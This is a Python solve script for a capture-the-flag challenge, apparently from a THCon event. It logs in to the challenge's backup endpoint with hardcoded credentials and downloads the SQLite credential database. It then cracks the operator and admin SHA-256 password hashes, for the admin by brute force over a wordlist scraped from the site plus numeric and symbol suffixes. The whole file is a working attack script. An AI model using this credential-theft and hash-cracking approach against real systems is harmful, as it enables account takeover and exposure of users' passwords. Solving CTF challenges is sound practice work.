#!/usr/bin/env python3
import hashlib
import re
import sqlite3
import unicodedata
from pathlib import Path

import requests


BASE_URL = "http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/"
BACKUP_CREDS = {"username": "sst", "password": "THC{s3cur3p455}"}


def fetch_db() -> Path:
    session = requests.Session()
    resp = session.post(f"{BASE_URL}backup.php", data=BACKUP_CREDS, timeout=10)
    resp.raise_for_status()
    path = resp.json()["path"]
    web_path = "/" + path.split("/var/www/html/", 1)[1]
    blob = session.get(f"{BASE_URL.rstrip('/')}{web_path}", timeout=10).content
    out = Path("db.bak")
    out.write_bytes(blob)
    return out


def load_hashes(db_path: Path) -> dict[str, str]:
    conn = sqlite3.connect(db_path)
    cur = conn.cursor()
    rows = cur.execute("select username, password from credentials").fetchall()
    return {user: pwd for user, pwd in rows}


def site_roots() -> set[str]:
    roots = set()
    pages = ["", "about.html", "register.php"]
    for page in pages:
        html = requests.get(f"{BASE_URL}{page}", timeout=10).text
        for token in re.findall(r"[A-Za-zÀ-ÿ][A-Za-zÀ-ÿ0-9#_-]{2,}", html):
            ascii_token = unicodedata.normalize("NFKD", token).encode("ascii", "ignore").decode()
            for item in (token, ascii_token):
                item = item.replace("#", "").replace("-", "").replace("_", "")
                if 3 <= len(item) <= 24 and any(ch.isalpha() for ch in item):
                    roots.add(item)
                    roots.add(item.capitalize())
                    roots.add(item.title())
    return roots


def crack_operator(target_hash: str) -> str:
    for candidate in ("Symphorien123!",):
        if hashlib.sha256(candidate.encode()).hexdigest() == target_hash:
            return candidate
    raise RuntimeError("operator password not found")


def crack_admin(target_hash: str) -> str:
    for root in sorted(site_roots()):
        for number in range(1000):
            suffix = f"{number:03d}"
            for special in "!@#$":
                candidate = f"{root}{suffix}{special}"
                if hashlib.sha256(candidate.encode()).hexdigest() == target_hash:
                    return candidate
    raise RuntimeError("admin password not found")


def main() -> int:
    db_path = fetch_db()
    hashes = load_hashes(db_path)
    operator = crack_operator(hashes["operator"])
    admin = crack_admin(hashes["admin"])

    print(f"[+] db backup saved to {db_path}")
    print(f"[+] operator = {operator}")
    print(f"[+] admin = {admin}")
    print(f"<FLAG>{admin}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
